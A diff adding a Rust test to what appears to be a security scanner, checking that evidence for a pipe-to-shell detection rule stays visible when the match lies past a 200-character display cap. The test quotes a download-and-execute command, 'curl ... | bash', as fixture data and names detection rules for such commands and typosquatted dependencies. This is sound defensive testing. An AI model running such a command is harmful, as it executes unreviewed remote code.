@@ -613,6 +613,40 @@ fn an_ambiguous_tld_in_host_position_is_still_a_host() {
 }
 
 #[test]
+fn the_evidence_contains_the_match_on_a_line_past_the_display_cap() {
+    // A minified bundle puts the download-and-execute chain past the
+    // 200-character display cap. Printing the head of the line and then naming a
+    // match that is not in it is a finding a reader cannot check, which defeats
+    // an evidence-grade tool (issue #10; 24 of 8,187 findings on the pilot
+    // corpus before the fix).
+    //
+    // The fixture carries a command rather than a credential on purpose: a
+    // realistic token in a test fixture is a real secret-shaped string in a
+    // public repository, and GitHub's push protection refuses it.
+    let out = scan_fixture("suspicious", "long-line-command");
+    assert_trips(&out, &["DL_PIPE_TO_SHELL"]);
+    let finding = out
+        .findings
+        .iter()
+        .find(|f| f.rule.0 == "DL_PIPE_TO_SHELL")
+        .expect("the pipe-to-shell rule must fire");
+    let text = &finding.evidence[0].text;
+    assert!(
+        text.contains("curl -sSL https://get.example.com/install.sh | bash"),
+        "the printed evidence must contain the match, got: {text}"
+    );
+    assert!(
+        text.chars().count() <= 200,
+        "the terminal cap still applies, got {} chars",
+        text.chars().count()
+    );
+    assert!(
+        text.starts_with("..."),
+        "a cut head must be marked, got: {text}"
+    );
+}
+
+#[test]
 fn typosquats_and_custom_index_are_caught() {
     let out = scan_fixture("suspicious", "typosquat-deps");
     assert_trips(&out, &["DEP_TYPOSQUAT", "DEP_CUSTOM_REGISTRY"]);
